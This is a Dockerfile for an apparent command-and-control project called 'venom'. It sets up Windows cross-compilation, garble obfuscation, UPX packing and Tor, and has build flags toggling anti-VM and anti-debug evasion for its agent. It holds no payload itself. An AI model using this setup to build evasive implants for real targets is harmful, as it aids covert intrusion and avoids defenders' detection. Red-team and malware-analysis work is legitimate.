FROM golang:1.22.1-alpine 

RUN apk update && apk upgrade
RUN apk add mingw-w64-gcc \
            dumb-init     \
            git           \
            upx           \
            tor

RUN go install mvdan.cc/garble@latest
COPY ./docker/torrc /etc/tor/torrc

ARG VENOM_DEBUG 
ENV VENOM_DEBUG $VENOM_DEBUG

ARG VENOM_ALLINT
ENV VENOM_ALLINT $VENOM_ALLINT

ARG VENOM_URL
ENV VENOM_URL $VENOM_URL

ARG VENOM_DISABLE_ANTIVM
ARG VENOM_DISABLE_ANTIVM $VENOM_DISABLE_ANTIVM

ARG VENOM_DISABLE_ANTIDEBUG
ARG VENOM_DISABLE_ANTIDEBUG $VENOM_DISABLE_ANTIDEBUG

WORKDIR /venom
COPY ./builder ./builder
COPY ./server  ./server 
COPY ./agent   ./agent

WORKDIR /venom/server
RUN go build

COPY ./docker/init.sh ./
RUN chmod +x init.sh
CMD ["/usr/bin/dumb-init", "./init.sh"]
